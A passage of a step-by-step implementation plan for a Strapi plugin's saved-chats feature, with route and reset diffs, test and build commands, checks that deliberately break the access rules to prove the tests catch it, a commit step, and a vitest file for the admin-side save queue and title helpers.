+      // The Ask tab's saved chats: each admin's own, for admins who hold the same permission as the chat.
+      { method: 'GET', path: '/conversations', handler: 'conversations.list', config: { policies: allow(ACTION.assistantUse) } },
+      { method: 'POST', path: '/conversations', handler: 'conversations.create', config: { policies: allow(ACTION.assistantUse) } },
+      { method: 'GET', path: '/conversations/:documentId', handler: 'conversations.findOne', config: { policies: allow(ACTION.assistantUse) } },
+      { method: 'PUT', path: '/conversations/:documentId', handler: 'conversations.update', config: { policies: allow(ACTION.assistantUse) } },
+      { method: 'DELETE', path: '/conversations/:documentId', handler: 'conversations.remove', config: { policies: allow(ACTION.assistantUse) } },
       { method: 'POST', path: '/demo/seed', handler: 'demo.seed', config: { policies: allow(ACTION.demoManage) } },
       { method: 'POST', path: '/demo/reset', handler: 'demo.reset', config: { policies: allow(ACTION.demoManage) } },
       { method: 'POST', path: '/demo/activity', handler: 'demo.activity', config: { policies: allow(ACTION.demoManage) } },
```

- [ ] **Step 6: Make Reset demo activity delete the saved chats**

`server/src/services/seed.ts`: the loop that deletes every inquiry becomes one function for any content type, `deleteEvery`, with the same batches of 5000 and the same stop when a document is still there after it was deleted. The saved chats are deleted last, after the demo activity. The answer of `resetDemoAppointments` does not count them.

```diff
@@
   };
 
   /**
-   * Deletes every inquiry, reading up to RESET_READ at a time until none are left, and answers how many it deleted. One
-   * read isn't enough: a busy concierge makes more inquiries than that. A delete that leaves its document there would
-   * make the next read answer it again for ever, so the reset stops, and says which one.
+   * Deletes every document of a content type, reading up to RESET_READ at a time until none are left, and answers how many it
+   * deleted. One read isn't enough: a busy concierge makes more inquiries than that. A delete that leaves its document there
+   * would make the next read answer it again for ever, so the reset stops, and says which one.
    */
-  const deleteEveryInquiry = async (): Promise<number> => {
+  const deleteEvery = async (uid: typeof UID.inquiry | typeof UID.conversation, noun: string): Promise<number> => {
     let deleted = 0;
     let previous = new Set<string>();
     for (;;) {
-      const batch = (await strapi.documents(UID.inquiry).findMany({ fields: ['documentId'], limit: RESET_READ })) as Array<{ documentId: string }>;
+      const batch = (await strapi.documents(uid).findMany({ fields: ['documentId'], limit: RESET_READ })) as Array<{ documentId: string }>;
       if (batch.length === 0) return deleted;
       const stuck = batch.find(({ documentId }) => previous.has(documentId));
-      if (stuck) throw new Error(`Inquiry ${stuck.documentId} is still there after it was deleted, so the reset stops.`);
-      for (const { documentId } of batch) await strapi.documents(UID.inquiry).delete({ documentId });
+      if (stuck) throw new Error(`${noun} ${stuck.documentId} is still there after it was deleted, so the reset stops.`);
+      for (const { documentId } of batch) await strapi.documents(uid).delete({ documentId });
       deleted += batch.length;
       previous = new Set(batch.map(({ documentId }) => documentId));
     }
@@
      * added, in every language, then every question and every inquiry (whether it is open, replied to or closed, and
      * however many there are), then every notification and appointment. The entries go first because a question is
      * where their ids are kept, so a reset that stops partway can run again and find them. Only entries a question
-     * names are deleted: the seeded product knowledge and the catalog stay.
+     * names are deleted: the seeded product knowledge and the catalog stay. The Ask tab's saved chats go last, every
+     * admin's: they quote the demo customers. The answer doesn't count them.
      */
     async resetDemoAppointments() {
       const questions = (await strapi.documents(UID.question).findMany({
@@
       for (const documentId of knowledgeIds) await strapi.documents(UID.knowledge).delete({ documentId, locale: '*' });
       for (const q of questions) await strapi.documents(UID.question).delete({ documentId: q.documentId });
 
-      const inquiries = await deleteEveryInquiry();
+      const inquiries = await deleteEvery(UID.inquiry, 'Inquiry');
 
       const notifications = await strapi.documents(UID.notification).findMany({ fields: ['documentId'], limit: RESET_READ });
       for (const n of notifications) await strapi.documents(UID.notification).delete({ documentId: n.documentId });
       const appointments = await strapi.documents(UID.appointment).findMany({ fields: ['documentId'], limit: RESET_READ });
       for (const a of appointments) await strapi.documents(UID.appointment).delete({ documentId: a.documentId });
+      // The Ask tab's saved chats quote the demo customers, so they go with them: every admin's, however many there are.
+      await deleteEvery(UID.conversation, 'Saved chat');
       return {
         appointments: appointments.length,
         notifications: notifications.length,
```

- [ ] **Step 7: Run the unit tests, then everything**

Run: `npm test -- test/unit/constants.test.ts test/unit/conversation-schema.test.ts test/unit/assistant-stored-messages.test.ts test/unit/assistant-conversations.test.ts test/unit/admin-routes.test.ts test/unit/seed.test.ts`
Expected: PASS, `Test Files  6 passed (6)` and `Tests  463 passed (463)`.

Run: `npm test`
Expected: PASS, `Test Files  110 passed (110)` and `Tests  3122 passed (3122)`.

Run: `npm run test:ts:back` and `npm run test:ts:front`
Expected: both finish with no error output.

Run: `rm -rf dist && npm run build`
Expected: it ends with `Build complete!`.

Run: `node scripts/check-esm-import.mjs`
Expected: exit 0, with one `ok` line for each of `dist/server/index.js` and `dist/server/index.mjs` saying there is no static load of `@tanstack/ai`.

Run: `node ../../../scripts/share-strapi-utils.mjs --check`
Expected: `Maison and oauth-mcp-manager share Strapi core's @strapi/utils.`

- [ ] **Step 8: Run the integration tests on a real Strapi**

The first run is the new file. The second is the whole integration suite, because the new content type and the change to the reset touch every file that boots Strapi or resets the demo activity. Both need the build from the step above. The suites boot their own Strapi on a database file of their own, in `strapi/.tmp/` (which git ignores), and open no port, so they leave Paul's dev server alone.

Run: `STRAPI_APP_DIR=/Users/paul/work/maison-demo/strapi node --test --test-concurrency=1 test/integration/assistant-conversations.test.mjs`
Expected: `ℹ pass 11` and `ℹ fail 0`. The `before` hook boots Strapi and takes a few seconds.

Run: `STRAPI_APP_DIR=/Users/paul/work/maison-demo/strapi npm run test:integration`
Expected: `ℹ pass 149` and `ℹ fail 0`.

- [ ] **Step 9: Prove the tests can fail**

Make each change, run the files named, see them fail, and undo the change. The last one needs a rebuild, because the integration suite loads the built plugin.

In `owned` in `services/conversations.ts`, answer any row, whoever it belongs to: `return row ?? null;`.

Run: `npm test -- test/unit/assistant-conversations.test.ts`
Expected: FAIL, among others: `the saved chats service > view > says there is no such chat for another admin's chat, in the same words as for an ID nobody has`; `the saved chats service > update > writes nothing for another admin's chat, or an ID nobody has, and says there is no such chat`; `the saved chats service > remove > deletes nothing of another admin's chat, and says there is no such chat`.

In `list` in `services/conversations.ts`, list every admin's chats: delete the line `filters: { adminUserId: { $eq: adminId } },`.

Run: `npm test -- test/unit/assistant-conversations.test.ts`
Expected: FAIL, among others: `the saved chats service > list > is the admin's own chats only, with the id, the title and when it was saved: no messages`; `the saved chats service > list > is empty for an admin with no chats`; `the saved chats controller > lists the signed-in admin's chats as { conversations }`.

In `cutTitle`, cut by UTF-16 units: replace `Array.from(text).slice(0, SAVED_CHATS.titleChars).join('')` with `text.slice(0, SAVED_CHATS.titleChars)`.

Run: `npm test -- test/unit/assistant-conversations.test.ts`
Expected: FAIL, among others: `cutTitle > counts characters, not UTF-16 units: a Japanese title and an emoji are never split`.

In `view`, never log a chat that cannot be read: replace `if (error) strapi.log.warn(` with `if (false) strapi.log.warn(`.

Run: `npm test -- test/unit/assistant-conversations.test.ts`
Expected: FAIL, among others: `the saved chats service > view > opens a chat whose stored messages cannot be read as an empty chat, and logs which one, without its content`.

In `stored-messages.ts`, let a thinking part lose the keys the check does not name, its signature among them: `const thinkingPart = z.object(`.

Run: `npm test -- test/unit/assistant-stored-messages.test.ts`
Expected: FAIL, among others: `toStoredMessages > keeps every key of every part: a thinking part with its signature, a tool call with its output, and the keys of a message`; `readStoredMessages > gives back the messages of an envelope, with every key`.

In `controllers/conversations.ts`, answer every failure as 400: replace the `code === 'not_found' ? ... : ...` in `fail` with `ctx.badRequest(message, { code, hint })`.

Run: `npm test -- test/unit/assistant-conversations.test.ts`
Expected: FAIL, among others: `the saved chats controller > another admin's chat > is a 404 for findOne, with the code not_found, and the same answer as for an ID nobody has`; `the saved chats controller > another admin's chat > is a 404 for update, with the code not_found, and the same answer as for an ID nobody has`; `the saved chats controller > another admin's chat > is a 404 for remove, with the code not_found, and the same answer as for an ID nobody has`.

In `routes/index.ts`, leave the delete route without a permission: `config: { policies: [] }`.

Run: `npm test -- test/unit/admin-routes.test.ts test/unit/assistant-conversations.test.ts`
Expected: FAIL, among others: `the saved chats routes > send DELETE /conversations/:documentId to conversations.remove, for admins who hold the assistant permission`; `the saved chats routes > are five, and all of them need the assistant permission and nothing less`; `admin routes > each require a signed-in admin with the matching Maison permission`.

In `seed.ts`, leave the saved chats when the demo activity is reset: delete the line `await deleteEvery(UID.conversation, 'Saved chat');`.

Run: `npm test -- test/unit/seed.test.ts`
Expected: FAIL, among others: `resetDemoAppointments > the saved chats of the Ask tab > deletes every one of them, every admin's, after the appointments, and does not count them in its answer`; `resetDemoAppointments > the saved chats of the Ask tab > reads them with no filter, as many at a time as the other content types, until none are left`; `resetDemoAppointments > the saved chats of the Ask tab > has nothing to delete when no admin has a chat`.

In `owned` in `services/conversations.ts`, answer any row again: `return row ?? null;`. Then rebuild and run the integration test.

Run: `rm -rf dist && npm run build && STRAPI_APP_DIR=/Users/paul/work/maison-demo/strapi node --test --test-concurrency=1 test/integration/assistant-conversations.test.mjs`
Expected: FAIL, among others: `keeps one admin's chat from another: it is not in their list, and opening, saving and deleting it answer 404, as an ID nobody has does`; `the Ask tab's saved chats, on a real Strapi`.

Undo the change, and run `rm -rf dist && npm run build` again, so `dist/` is the built plugin.

- [ ] **Step 10: Commit**

From `/Users/paul/work/maison-demo`:

```bash
git add strapi/src/plugins/maison/server/src/assistant/stored-messages.ts strapi/src/plugins/maison/server/src/constants.ts strapi/src/plugins/maison/server/src/content-types/conversation/index.ts strapi/src/plugins/maison/server/src/content-types/conversation/schema.json strapi/src/plugins/maison/server/src/content-types/index.ts strapi/src/plugins/maison/server/src/controllers/conversations.ts strapi/src/plugins/maison/server/src/controllers/index.ts strapi/src/plugins/maison/server/src/routes/index.ts strapi/src/plugins/maison/server/src/services/conversations.ts strapi/src/plugins/maison/server/src/services/index.ts strapi/src/plugins/maison/server/src/services/seed.ts strapi/src/plugins/maison/test/integration/assistant-conversations.test.mjs strapi/src/plugins/maison/test/unit/admin-routes.test.ts strapi/src/plugins/maison/test/unit/assistant-conversations.test.ts strapi/src/plugins/maison/test/unit/assistant-stored-messages.test.ts strapi/src/plugins/maison/test/unit/constants.test.ts strapi/src/plugins/maison/test/unit/conversation-schema.test.ts strapi/src/plugins/maison/test/unit/fake-conversations.ts strapi/src/plugins/maison/test/unit/seed.test.ts
git commit -m "maison: saved chats on the server: the content type, five routes, and Reset demo activity clears them" -m "Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>" -- strapi/src/plugins/maison/server/src/assistant/stored-messages.ts strapi/src/plugins/maison/server/src/constants.ts strapi/src/plugins/maison/server/src/content-types/conversation/index.ts strapi/src/plugins/maison/server/src/content-types/conversation/schema.json strapi/src/plugins/maison/server/src/content-types/index.ts strapi/src/plugins/maison/server/src/controllers/conversations.ts strapi/src/plugins/maison/server/src/controllers/index.ts strapi/src/plugins/maison/server/src/routes/index.ts strapi/src/plugins/maison/server/src/services/conversations.ts strapi/src/plugins/maison/server/src/services/index.ts strapi/src/plugins/maison/server/src/services/seed.ts strapi/src/plugins/maison/test/integration/assistant-conversations.test.mjs strapi/src/plugins/maison/test/unit/admin-routes.test.ts strapi/src/plugins/maison/test/unit/assistant-conversations.test.ts strapi/src/plugins/maison/test/unit/assistant-stored-messages.test.ts strapi/src/plugins/maison/test/unit/constants.test.ts strapi/src/plugins/maison/test/unit/conversation-schema.test.ts strapi/src/plugins/maison/test/unit/fake-conversations.ts strapi/src/plugins/maison/test/unit/seed.test.ts
```


---

### Task 7: Saved chats in the Ask tab: the sidebar, saving after each turn, and opening, deleting and starting chats

**Group:** Step 1c. After this task the Ask tab saves every turn, reopens the last chat when it opens, and has the history sidebar. Nothing is left of the old "no saved chats" behaviour.

Read first: the spec's rebuild section ("Saved chats", "What stays"); the map's sections 1.11, 3.3 (change 9), 3.4 (the panels' REST calls, and the sidebar rows and New chat while an answer streams) and 4.2; R/`admin/src/components/ConversationSidebar.tsx` (all of it), R/`admin/src/hooks/useConversations.ts` and R/`admin/src/components/ChatPanel.tsx:177-206` (how a chat is loaded and switched). Code: `admin/src/components/assistant/AssistantProvider.tsx` (all of it: it changes the most), `admin/src/assistant.ts` (`withoutOpenToolCalls`, `withoutFailedTurn`, `MessageLike`, `PartLike`), `ChatArea.tsx`, `AskTab.tsx`, `test/unit/ask-tab.test.tsx`, and the five routes of Task 6.

**Files:**
- Create: `admin/src/conversations.ts`, `admin/src/components/assistant/ConversationSidebar.tsx`
- Modify: `admin/src/components/assistant/AssistantProvider.tsx`, `admin/src/components/assistant/ChatArea.tsx`, `admin/src/components/assistant/AskTab.tsx`
- Test: create `test/unit/conversations-admin.test.ts`, `test/unit/conversation-sidebar.test.tsx`; modify `test/unit/chat-area.test.tsx`, `test/unit/ask-tab.test.tsx`

**Interfaces:**
- Consumes: the five routes of Task 6, under `/maison` (a test holds the page's paths to the server's); `useFetchClient()` from `@strapi/strapi/admin` (`get`, `post`, `put`, `del`; an HTTP error is thrown with a `status`); `useChat`'s `setMessages`, `clear` and `stop`; `withoutOpenToolCalls`, `withoutFailedTurn`, `MessageLike` and `PartLike`; `ChatArea` (Tasks 3 and 5), `MessageList`, `Composer`, `ErrorBox`; `renderInTheme`. Tests only: `cutTitle` and `SAVED_CHATS` from the server.
- Produces:
  ```ts
  // admin/src/conversations.ts
  export const CONVERSATION_PATHS: { list: '/maison/conversations'; one: (documentId: string) => string };
  export interface SavedChatRow { documentId: string; title: string; updatedAt: string }
  export const HISTORY_ERRORS: { list: string; open: string; save: string; remove: string };   // the four staff texts
  export const isSavedRow, isChatList, isChatAnswer, isSavedAnswer: (value: unknown) => boolean;   // checks of what the server answers
  export const conversationTitle: (messages: readonly MessageLike[]) => string;   // the first staff message, one line, at most 80 characters, or "New chat"
  export const withSavedChat: (list: readonly SavedChatRow[], row: SavedChatRow) => SavedChatRow[];     // the row at the top, once
  export const withoutSavedChat: (list: readonly SavedChatRow[], documentId: string) => SavedChatRow[];
  export const savedKeyOf: (messages: readonly unknown[]) => string;
  export const needsSaving: (messages: readonly unknown[], savedKey: string) => boolean;   // has messages, and they differ from the saved key
  export const isNotFound: (error: unknown) => boolean;
  export interface ChatSnapshot { title: string; messages: unknown[] }
  export interface SaveQueueDeps {
    create: (snapshot: ChatSnapshot) => Promise<SavedChatRow>;
    update: (documentId: string, snapshot: ChatSnapshot) => Promise<SavedChatRow>;
    onSaved: (row: SavedChatRow, info: { created: boolean; current: boolean }) => void;   // current: the chat it saved is still the open one
    onError: (error: unknown) => void;                        // the queue goes on with the next save
  }
  export interface SaveQueue {
    openId: () => string | null;                              // the saved chat that is open, or null for one not saved yet
    switchTo: (documentId: string | null) => void;            // another chat is open: a saved one, or a new one
    save: (snapshot: ChatSnapshot) => Promise<void>;          // after every save made before it
    idle: () => Promise<void>;                                // resolves when every save made so far is over
    forget: (documentId: string) => void;                     // a chat was deleted
  }
  export const createSaveQueue: (deps: SaveQueueDeps) => SaveQueue;
  // AssistantProvider.tsx: the API gains
  history: { chats: SavedChatRow[]; openId: string | null; sidebarOpen: boolean; setSidebarOpen: (open: boolean) => void; error: string | null;
             openChat: (documentId: string) => Promise<void>; deleteChat: (documentId: string) => Promise<void> };
  // ConversationSidebar.tsx
  export const ConversationSidebar: (props: { chats: readonly SavedChatRow[]; openId: string | null; open: boolean; busy: boolean;
                                              onSelect: (documentId: string) => void; onNew: () => void; onDelete: (documentId: string) => void }) => JSX.Element;
  // ChatArea.tsx gains: sidebar: ReactNode; historyOpen: boolean; onToggleHistory: () => void
  ```
- Decisions made here, all of them tested below:
  - **When a chat is saved.** The provider's one idle effect, which already cleans the chat whenever nothing is answering, now also saves the cleaned messages when they have changed since the chat was last saved or opened (`needsSaving`). So any turn that ends saves, however it ended, with no cut-off tool call and no failed turn in what is saved. An empty chat is never saved, and a chat that has not changed is not saved again.
  - **The saves.** One queue (`createSaveQueue`) runs them one at a time. A save belongs to the chat that was open when it was made, and what a create answers becomes the open chat's ID only while that chat is still open. A save that finds its chat gone (404) creates it again as a new chat, with no error. Any other failure shows "Couldn't save this chat." and the next turn tries again.
  - **New chat** stops the answer, saves the cleaned chat first (a question that has no answer yet is not part of it), then shows an empty chat. The old chat stays in the sidebar. The draft stays.
  - **Opening and deleting** wait for the saves that are on their way, so a delete runs only after the saves that were made before it, and the chat that is left is saved as it was. The latest request to open a chat wins: an answer that comes late for an earlier choice is dropped. Both do nothing while an answer comes (the buttons are off, and the provider checks too).
  - **When Ask opens,** the list loads and the most recent chat is reopened, unless staff have already begun something (sent a message, started a chat, chosen a chat), even a turn that failed and left nothing in the chat.
  - **A chat is switched with `setMessages`,** never by changing the thread, which would build the chat client again. A chat that the server could not read arrives as no messages and opens as an empty chat, and the next turn saves into it.
  - **Errors** are the four texts in `HISTORY_ERRORS`, shown in the red box under the messages. A turn's own error wins when both are there. The next call that works clears the text.
  - **The sidebar** is closed at first, and its open or closed state is kept in the provider, so it survives a change of tab. Closed, it is `inert` (the reference sets only `aria-hidden`, which leaves its buttons in the tab order). While an answer comes its rows, New chat and trash buttons are off. The trash button is named "Delete chat: <title>": the reference says "conversation", and Maison's staff words are "chat".
  - **Nothing caps the size of a saved chat** except Strapi's 1 MB body limit (see Task 6): a chat that is too big to save shows "Couldn't save this chat." and goes on working.

**Review Focus covered here:**
- 2. The other side of a chat that is gone: a save that finds it gone creates it again with no error, opening one says so and loads the list again, and deleting one that is already gone deletes it all the same. Pinned by `the save queue > saves a chat again as a new chat when the chat is not there any more: ...` and, in `ask-tab.test.tsx`, `saving > saves a chat that was deleted elsewhere as a new chat, with no error`, `when a call to the saved chats fails > says the chat could not be opened, and loads the list again: the chat may be gone` and `deleting > takes the row out when the chat was already gone: it is deleted all the same`.
- 3. A save in flight against Stop, New chat, opening another chat and deleting a chat. Pinned by `the save queue > creates a chat once when two saves are made before the first has answered: the second waits and updates it`, `... runs the saves one at a time, in the order they were made`, `starting another chat > sends a save that was made before the switch to the chat it was made for, even when it runs after it` and `... does not give the new chat the ID of the chat that was being created`; and in `ask-tab.test.tsx` by `saving > saves only the cleaned messages: a tool call that Stop cut off is not in the saved chat`, `New chat > saves the chat as it is when New chat stops an answer on its way: ...`, `deleting > waits for a save that is on its way before it deletes the chat`, `waits for a save that is on its way before it opens another chat, so the chat that is left is saved as it was` and `opens the chat that was chosen last when two are chosen one after the other: the answer that comes late is dropped`.
- 4. A chat the server could not read opens as an empty chat and is saved into, and a chat opened and saved again keeps every key of every part. Pinned in `ask-tab.test.tsx` by `opens a saved chat that has no messages, as one the server could not read, as an empty chat, and saves the next turn into it` and `keeps every key of every part of a chat it opens, so it saves the chat again as it was: a thinking part keeps its signature`.
- 5. A title of Japanese text or emoji is cut at 80 characters as the server cuts it. Pinned by `conversationTitle > counts characters, so an emoji or a Japanese character is never split` and `conversationTitle > is cut exactly as the server cuts a title`.

- [ ] **Step 1: Write the failing tests**

`conversations-admin.test.ts` holds the pure helpers and the save queue, with a deferred promise to decide when a request answers. `conversation-sidebar.test.tsx` holds the sidebar on its own. `chat-area.test.tsx` gets the sidebar and the History button. `ask-tab.test.tsx` is replaced by a file that keeps every test of Task 5 and adds the saved chats: its `world` helper now also stands in for the five routes (a table of chats, newest first, as the server lists them) and returns that table as `rows`.

Create `test/unit/conversations-admin.test.ts`:

```ts
import { describe, expect, it, vi, type Mock } from 'vitest';
import {
  CONVERSATION_PATHS,
  HISTORY_ERRORS,
  conversationTitle,
  createSaveQueue,
  isChatAnswer,
  isChatList,
  isSavedAnswer,
  isSavedRow,
  needsSaving,
  savedKeyOf,
  withSavedChat,
  withoutSavedChat,
  type ChatSnapshot,
  type SavedChatRow,
  type SaveQueueDeps,
} from '../../admin/src/conversations';
import routes from '../../server/src/routes';
import { SAVED_CHATS } from '../../server/src/constants';
import { cutTitle } from '../../server/src/services/conversations';

type Doc = Record<string, any>;
type Message = { id: string; role: string; parts: Doc[] };

const text = (content: string): Doc => ({ type: 'text', content });
const staff = (id: string, ...parts: Doc[]): Message => ({ id, role: 'user', parts });
const assistant = (id: string, ...parts: Doc[]): Message => ({ id, role: 'assistant', parts });
const row = (documentId: string, title = 'A chat', updatedAt = '2026-10-07T00:00:00.000Z'): SavedChatRow => ({ documentId, title, updatedAt });

describe('the saved chats paths', () => {
  // Admin routes are served at /maison<path>, so the page's paths are the server's own with that prefix.
  it("are the routes the server has, under the plugin's admin prefix", () => {
    const served = (method: string, handler: string) => {
      const found = routes.admin.routes.filter((route) => route.method === method && route.handler === handler);
      expect(found, `${method} ${handler}`).toHaveLength(1);
      return `/maison${found[0].path}`;
    };
    expect(CONVERSATION_PATHS.list).toBe(served('GET', 'conversations.list'));
    expect(CONVERSATION_PATHS.list).toBe(served('POST', 'conversations.create'));
    const one = served('GET', 'conversations.findOne');
    expect(served('PUT', 'conversations.update')).toBe(one);
    expect(served('DELETE', 'conversations.remove')).toBe(one);
    expect(CONVERSATION_PATHS.one(':documentId')).toBe(one.replace(':documentId', encodeURIComponent(':documentId')));
    expect(CONVERSATION_PATHS.one('abc123')).toBe('/maison/conversations/abc123');
  });

  it('write an ID so it stays one path segment', () => {
    expect(CONVERSATION_PATHS.one('a/b?c#d')).toBe('/maison/conversations/a%2Fb%3Fc%23d');
  });
});

describe('what the server answers', () => {
  const messages = [staff('u1', text('Hi'))];

  it('is a saved row when it has an ID, a title and a time', () => {
    expect(isSavedRow(row('c1'))).toBe(true);
    for (const value of [null, undefined, 'c1', [], {}, { documentId: 'c1', title: 'x' }, { documentId: '', title: 'x', updatedAt: 'y' }, { documentId: 1, title: 'x', updatedAt: 'y' }, { documentId: 'c1', title: 5, updatedAt: 'y' }]) {
      expect(isSavedRow(value), JSON.stringify(value)).toBe(false);
    }
  });

  it('is a list when every one of its rows is', () => {
    expect(isChatList({ conversations: [row('c1'), row('c2')] })).toBe(true);
    expect(isChatList({ conversations: [] })).toBe(true);
    for (const value of [null, {}, { conversations: 'x' }, { conversations: [row('c1'), { documentId: 'c2' }] }, [row('c1')]]) expect(isChatList(value), JSON.stringify(value)).toBe(false);
  });

  it('is an opened chat when it has a row and its messages', () => {
    expect(isChatAnswer({ conversation: { ...row('c1'), messages } })).toBe(true);
    expect(isChatAnswer({ conversation: { ...row('c1'), messages: [] } })).toBe(true);
    for (const value of [null, {}, { conversation: row('c1') }, { conversation: { ...row('c1'), messages: 'x' } }, { conversation: { documentId: 'c1', messages } }]) expect(isChatAnswer(value), JSON.stringify(value)).toBe(false);
  });

  it('is a saved answer when it names the row', () => {
    expect(isSavedAnswer({ conversation: row('c1') })).toBe(true);
    expect(isSavedAnswer({ conversation: { documentId: 'c1' } })).toBe(false);
    expect(isSavedAnswer({})).toBe(false);
  });
});

describe('conversationTitle', () => {
  it('is the first staff message', () => {
    expect(conversationTitle([staff('u1', text('Which visits are waiting?')), assistant('a1', text('Two.')), staff('u2', text('And questions?'))])).toBe('Which visits are waiting?');
  });

  it('puts the words on one line: line breaks and runs of spaces become single spaces', () => {
    expect(conversationTitle([staff('u1', text('  Which visits\n\nare   waiting?  '))])).toBe('Which visits are waiting?');
  });

  it('is cut to 80 characters, and one of 80 is not cut', () => {
    expect(conversationTitle([staff('u1', text('a'.repeat(80)))])).toBe('a'.repeat(80));
    expect(conversationTitle([staff('u1', text('a'.repeat(81)))])).toBe('a'.repeat(80));
  });

  it('counts characters, so an emoji or a Japanese character is never split', () => {
    expect(conversationTitle([staff('u1', text('😀'.repeat(100)))])).toBe('😀'.repeat(80));
    const japanese = '今日のお客様からの問い合わせを教えてください。'.repeat(5);
    expect(Array.from(conversationTitle([staff('u1', text(japanese))]))).toHaveLength(80);
  });

  it('joins the text parts of the message, and skips the parts that are not text', () => {
    expect(conversationTitle([staff('u1', text('First'), { type: 'thinking', content: 'x' }, text('second'))])).toBe('First second');
  });

  it('is "New chat" when there is no staff message, or it has no words', () => {
    expect(conversationTitle([])).toBe('New chat');
    expect(conversationTitle([assistant('a1', text('Hello.'))])).toBe('New chat');
    expect(conversationTitle([staff('u1', text('  \n '))])).toBe('New chat');
    expect(conversationTitle([staff('u1')])).toBe('New chat');
  });

  // The page and the server each cut a title, and they are the same cut: the title staff see is the title the server keeps.
  it('is cut exactly as the server cuts a title', () => {
    expect(SAVED_CHATS.titleChars).toBe(80);
    for (const title of ['Which visits are waiting?', '  spaced \n out  ', 'x'.repeat(300), '😀'.repeat(90), '今日のお客様からの問い合わせを教えてください。'.repeat(6), '', '   ']) {
      expect(conversationTitle([staff('u1', text(title))]), JSON.stringify(title)).toBe(cutTitle(title));
    }
  });
});

describe('the list of saved chats', () => {
  it('puts a chat that was just saved at the top, once', () => {
    const list = [row('c1'), row('c2'), row('c3')];
    expect(withSavedChat(list, row('c2', 'Renamed')).map((chat) => chat.documentId)).toEqual(['c2', 'c1', 'c3']);
    expect(withSavedChat(list, row('c2', 'Renamed'))[0].title).toBe('Renamed');
    expect(withSavedChat(list, row('c9')).map((chat) => chat.documentId)).toEqual(['c9', 'c1', 'c2', 'c3']);
    expect(withSavedChat([], row('c1'))).toEqual([row('c1')]);
  });

  it('takes a deleted chat out, and leaves the list as it was for an ID that is not in it', () => {
    const list = [row('c1'), row('c2')];
    expect(withoutSavedChat(list, 'c1')).toEqual([row('c2')]);
    expect(withoutSavedChat(list, 'nobody')).toEqual(list);
  });

  it('does not change the list it was given', () => {
    const list = Object.freeze([row('c1'), row('c2')]);
    withSavedChat(list, row('c2'));
    withoutSavedChat(list, 'c1');
    expect(list).toHaveLength(2);
  });
});

describe('needsSaving', () => {
  const messages = [staff('u1', text('Hi')), assistant('a1', text('Hello.'))];

  it('is true for a chat that has messages no save has taken yet', () => {
    expect(needsSaving(messages, '')).toBe(true);
  });

  it('is false for the messages that were last saved or opened: a chat is not saved again for nothing', () => {
    expect(needsSaving(messages, savedKeyOf(messages))).toBe(false);
    expect(needsSaving([...messages], savedKeyOf(messages))).toBe(false);
  });

  it('is true again once the chat has changed, a message or only a part of one', () => {
    expect(needsSaving([...messages, staff('u2', text('More'))], savedKeyOf(messages))).toBe(true);
    expect(needsSaving([messages[0], assistant('a1', text('Hello. And more.'))], savedKeyOf(messages))).toBe(true);
  });

  it('is false for an empty chat, whatever was saved: an empty chat is never saved', () => {
    expect(needsSaving([], '')).toBe(false);
    expect(needsSaving([], savedKeyOf(messages))).toBe(false);
  });
});

describe('the save queue', () => {
  /** A promise that is settled from outside, so a test decides when a request of the queue answers. */
  const deferred = <T,>() => {
    let resolve!: (value: T) => void;
    let reject!: (error: unknown) => void;
    const promise = new Promise<T>((done, fail) => {
      resolve = done;
      reject = fail;
    });
    return { promise, resolve, reject };
  };
  const snapshot = (title: string, ...messages: Doc[]): ChatSnapshot => ({ title, messages });
  /** The queue over requests that answer at once, recording each. `create` and `update` can be replaced by a test that needs to hold one back. */
  const queueWith = (overrides: { create?: Mock<SaveQueueDeps['create']>; update?: Mock<SaveQueueDeps['update']> } = {}) => {
    let made = 0;
    const log: string[] = [];
    const deps = {
      create: vi.fn<SaveQueueDeps['create']>(async (shot) => {
        made += 1;
        log.push(`create ${shot.title}`);
        return row(`chat-${made}`, shot.title);
      }),
      update: vi.fn<SaveQueueDeps['update']>(async (documentId, shot) => {
        log.push(`update ${documentId} ${shot.title}`);
        return row(documentId, shot.title);
      }),
      onSaved: vi.fn<SaveQueueDeps['onSaved']>(),
      onError: vi.fn<SaveQueueDeps['onError']>(),
      ...overrides,
    };
    return { queue: createSaveQueue(deps), deps, log };
  };

  it('creates a new chat on its first save, and updates that chat on every later save', async () => {
    const { queue, log } = queueWith();
    expect(queue.openId()).toBeNull();
    await queue.save(snapshot('One'));
    expect(queue.openId()).toBe('chat-1');
    await queue.save(snapshot('One', staff('u1')));
    await queue.save(snapshot('One', staff('u1'), assistant('a1')));
    expect(log).toEqual(['create One', 'update chat-1 One', 'update chat-1 One']);
  });

  it('tells what each save did: created or updated, and the row', async () => {
    const { queue, deps } = queueWith();
    await queue.save(snapshot('One'));
    await queue.save(snapshot('One'));
    expect(deps.onSaved.mock.calls).toEqual([
      [row('chat-1', 'One'), { created: true, current: true }],
      [row('chat-1', 'One'), { created: false, current: true }],
    ]);
  });

  // The bug that gave strapi-plugin-tanstack-ai two identical chats in its sidebar: two saves started before the first had an ID.
  it('creates a chat once when two saves are made before the first has answered: the second waits and updates it', async () => {
    const first = deferred<SavedChatRow>();
    const { queue, deps, log } = queueWith({ create: vi.fn<SaveQueueDeps['create']>(() => first.promise) });
    const one = queue.save(snapshot('One'));
    const two = queue.save(snapshot('One', staff('u1')));
    await Promise.resolve();
    expect(deps.create).toHaveBeenCalledTimes(1);
    expect(deps.update).not.toHaveBeenCalled();
    first.resolve(row('chat-1', 'One'));
    await Promise.all([one, two]);
    expect(deps.create).toHaveBeenCalledTimes(1);
    expect(deps.update).toHaveBeenCalledExactlyOnceWith('chat-1', snapshot('One', staff('u1')));
    expect(log).toEqual(['update chat-1 One']);
  });

  it('runs the saves one at a time, in the order they were made', async () => {
    const gates = [deferred<SavedChatRow>(), deferred<SavedChatRow>(), deferred<SavedChatRow>()];
    const started: string[] = [];
    let call = 0;
    const { queue } = queueWith({
      create: vi.fn<SaveQueueDeps['create']>(async (shot) => {
        started.push(`create ${shot.title}`);
        return gates[call++].promise;
      }),
      update: vi.fn<SaveQueueDeps['update']>(async (_documentId, shot) => {
        started.push(`update ${shot.title}`);
        return gates[call++].promise;
      }),
    });
    const all = [queue.save(snapshot('A')), queue.save(snapshot('B')), queue.save(snapshot('C'))];
    await Promise.resolve();
    expect(started).toEqual(['create A']);
    gates[0].resolve(row('chat-1'));
    await new Promise((resolve) => setTimeout(resolve, 0));
    expect(started).toEqual(['create A', 'update B']);
    gates[1].resolve(row('chat-1'));
    await new Promise((resolve) => setTimeout(resolve, 0));
    gates[2].resolve(row('chat-1'));
    await Promise.all(all);
